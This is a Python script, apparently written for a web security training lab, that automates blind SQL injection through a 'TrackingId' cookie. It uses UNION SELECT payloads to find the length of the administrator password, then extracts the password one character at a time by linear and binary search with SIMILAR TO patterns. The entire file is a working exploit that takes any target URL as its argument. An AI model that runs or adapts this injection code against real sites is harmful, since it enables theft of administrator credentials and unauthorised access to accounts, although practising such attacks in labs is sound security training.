import requests, sys
from bs4 import BeautifulSoup
import urllib.parse
import time
import math


def try_query(query):
    """ This method takes a SQL query string and inserts it into the
        vulnerable cookie. This method returns True if the query is successfully
        processed, else it returns False.
    Args:
        query (str): SQL query string that breaks the 
                     vulnerable interpreter
    Returns:
        Boolean: If query was successfully executed then True is returned
                 If the query fails and the page crashes then False is returned. 
    """
    try:
        global url
        mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
        resp = requests.get(url, cookies=mycookies)
        if resp.status_code == 400 or resp.status_code == 404:
            print("Error code 400 or 404 received. The site has most likely timed out")
            quit()
        soup = BeautifulSoup(resp.text, 'html.parser')
        if soup.find('div', text='Welcome back!'):
            return True
        else:
            return False
    except:
        print("It seems as though the website has timed out or there is trouble with your connection")
        print("Please check your network/site status and try again.")
        quit()


def findPasswordLength():
    """ This method begins with querying the vulnerable database
        to see if the 'administrator' has a password of length 1. The
        password length is incremented by 1 upon each failed query. When
        the query is successful and True is returned from "try_query()" then
        we know that the correct password length has been found.
    Args:
        None
    Returns:
        num (int): number of characters in the password to find.
    """
    begin_time = time.perf_counter()
    num = 1
    while True:
        query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
        if try_query(query) == False:
            num = num + 1
        else:
            break;
    return num

def linearSearch(passwordLength):
    """
    Args: 
        passwordLength (int): The number of characters in the password we are
                              attempting to crack.

    Returns:
        realPassword (str): The password of the administrator account.
    """

    characterSet = "abcdefghijklmnopqrstuvwxyz0123456789"
    passwordInProgress = ""
    realPassword = ""
    i = 0
    while(len(realPassword) < passwordLength):
        passwordInProgress = realPassword + characterSet[i] + "%"
        query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND password SIMILAR TO '{passwordInProgress}'--"
        if try_query(query) == False:
            i += 1
        else:
            realPassword += characterSet[i]           
            i = 0
    return realPassword

def binarySearch(low, high):
    """
        Args:
            low (int): lowest index of the character set array you are checking
            high (int): highest index of the character set array you are checking.

        Returns:
            None: global "realPassword" array is shared so no returns are necessary.

        Global variable "passwordLength" is an int that represents the number of characters
        in the password we are looking for. The global variable "realPassword" is a string. 
        Originally, it is an empty string that progressively gets appended to with characters
        found in this method. The final global variable is "characterSet" that is the character set
        containing possible characters which can be in the password.
    """
    global passwordLength
    global realPassword
    global characterSet

    # If the low index of the search range is larger than the high index of the search
    # range then the character isn't in the range you we searching so you should return.
    if(low > high):
        return
    
    # To find the approximate mid-point of the character set, add the low index to the high index,
    # divide by 2 and take the floor of that result to get approximately half.
    mid = math.floor((low + high)/2)

    # Ask if the password character lies in the "front" half of the search range.
    query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND password SIMILAR TO '{realPassword}[{characterSet[low:mid]}]%'--"
    
    # If the 'realPassword' is the correct length then there is no more work to do.
    # return to main.
    if(len(realPassword) == passwordLength):
        return     

    # If the character we are looking for lies in this range then go into this statement.
    elif(try_query(query) == True):    

        # If the length of the set I am testing is 1 then I have found the correct character
        # append it to the 'realPassword' variable. Display the password so far then return.
        if(len(characterSet[low:high]) == 1):
            realPassword += characterSet[low]
            print(f"{realPassword}")
            return
        
        # If the password is in this range but the range has more than 1 character then I have
        # more work to do. Call binarySearch again passing in the low index as the new low index,
        # and the middle index as the new high index.
        else:
            binarySearch(low, mid)

    # The character I am looking for is not in the "front" half of the characterSet range I tested,
    # so it is in the "back" half.
    else:
        
        # If the character in question is in the "back" half of the character set I am testing 
        # AND the length is not 1 then I still have work to do. Call binarySearch with the mid
        # index as the new low index and the high index as the new high index.
        if(len(characterSet[mid:high]) != 1):
            binarySearch(mid, high)

        # My character set IS only 1 char long so this is the correct character. Append it to the
        # real password and return.
        else:
            realPassword += characterSet[mid:high]
            print(f"{realPassword}")
            return



def main():
    """
    Args:
        None
    Returns:
        None

        This method takes a command line argument in the form of a string url to the lab
        website. This method strips the unimportant bits from the url and creates a new url for use
        in the lab. This method has three global variables. The first global variable is "realPassword"
        which represents the final password given at the end of the program. The global variable 
        "passwordLength" is the number of characters in the administrator password we are looking for.
        The third global variable is "characterSet" which contains the possible characters that can be in
        the password. The last global variable is "url" which is used by try_query() to send sql queries to 
        the site.
    """
    global realPassword
    global passwordLength
    global characterSet
    global url

    site = sys.argv[1]
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')
    url = f'https://{site}/'

    
    characterSet = "abcdefghijklmnopqrstuvwxyz0123456789"
    realPassword = ""
    
    # Find the length of the password by probing the database iteratively.
    print("Determining password length...")
    passwordLength = findPasswordLength()

    print(f"Password is {passwordLength} characters in length.")

    # When password length is found, begin timing how long it takes to fully determine the password
    # in question. 
    begin_time = time.perf_counter()

    # while the global variable "realPassword" is NOT the correct length,
    # keep executing the binary search. '0' as an argument represents the 
    # first index of the character set. '36' as an argument represents the total
    # number of characters in the character set (i.e a-z and 0-9)
    while(len(realPassword) < passwordLength):
        binarySearch(0,36)
  

    print(f"Administrator Password: {realPassword}")
    print(f"Binary Search Algorithm: {time.perf_counter()-begin_time} seconds.")
    


main()
